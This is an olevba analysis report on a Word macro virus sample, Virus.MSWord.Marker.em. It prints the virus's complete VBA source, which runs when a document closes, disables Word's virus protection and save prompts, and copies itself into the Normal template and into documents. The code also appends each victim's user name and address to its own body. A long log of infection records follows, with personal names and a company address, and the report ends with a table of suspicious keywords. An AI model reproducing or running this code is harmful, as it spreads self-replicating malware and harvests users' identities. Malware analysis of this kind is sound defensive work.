olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.em
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.em - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - среда, 3 май 2000
' Пожелал  остаться неизвестным
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - воскресенье, 14 май 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - понедельник, 15 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - вторник, 16 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - четверг, 18 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:25:39 - понедельник, 29 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:10:40 - вторник, 30 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:26:48 - среда, 31 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:05:35 - среда, 31 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:00:58 - четверг, 1 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:12:39 - четверг, 1 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:53:15 - пятница, 2 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:30:05 - воскресенье, 4 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:21 - понедельник, 5 июн 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:29:43 - четверг, 8 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:45 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:35:08 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:35:46 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:21 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:37:01 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:37:29 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:06 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:38 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:39:26 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:40:12 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:40:46 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:41:29 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:42:03 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:43:04 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:43:50 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:46:52 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:02:12 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:39:23 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:50:11 - суббота, 10 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:43:32 - суббота, 24 июн 2000
' Klient
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:24:05 - суббота, 15 июл 2000
' Klient
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:55:48 - вторник, 1 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:56:52 - вторник, 1 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:10:00 - четверг, 3 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:04 - четверг, 3 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:55:33 - четверг, 10 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:57:07 - четверг, 10 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:19:38 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:23:41 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:42:42 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:18:14 - вторник, 26 сен 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:57:13 - четверг, 28 сен 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:41:44 - четверг, 28 сен 2000
' Compaq Distributor
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:24:45 - Monday, 23 Oct 2000
' Fatima
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:41:01 - четверг, 26 окт 2000
' Oleg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:43:56 - четверг, 26 окт 2000
' Oleg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:58:56 - суббота, 28 окт 2000
' *
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:21:48 - понедельник, 13 ноя 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:56:57 - понедельник, 13 ноя 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:21:26 - понедельник, 13 ноя 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:39:30 - понедельник, 20 ноя 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:11:05 - понедельник, 20 ноя 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:23:14 - вторник, 21 ноя 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:58:26 - вторник, 12 дек 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:37:01 - четверг, 14 дек 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:44:20 - пятница, 15 дек 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:03:26 - понедельник, 18 дек 2000
' Стригина
' ЗАО "Аскадпейпер"
' ул. Пугачёвская, 3-202,
' 220005, г. Минск.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:40:14 - среда, 25 апр 2001
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:37:20 - среда, 2 май 2001
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - четверг, 10 май 2001
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:41:28 - среда, 20 июн 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:01:17 - пятница, 13 июл 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:10:15 - пятница, 13 июл 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:57:08 - понедельник, 16 июл 2001
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:19 - вторник, 17 июл 2001
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:32:02 - пятница, 3 авг 2001
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:02:06 - пятница, 7 сен 2001
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:28:12 - понедельник, 10 сен 2001
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:23:42 - четверг, 31 янв 2002
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:30:39 - понедельник, 4 фев 2002
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:46:26 - вторник, 5 фев 2002
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:27:15 - четверг, 7 фев 2002
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:23:19 - пятница, 8 фев 2002
' KBD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:18:18 - среда, 13 фев 2002
' А
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:46:55 - четверг, 14 мар 2002
' А
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 02:45:13 - пятница, 15 мар 2002
' Антони Владимир Юрьевич
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:07:27 - воскресенье, 17 мар 2002
' ANTSRV
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

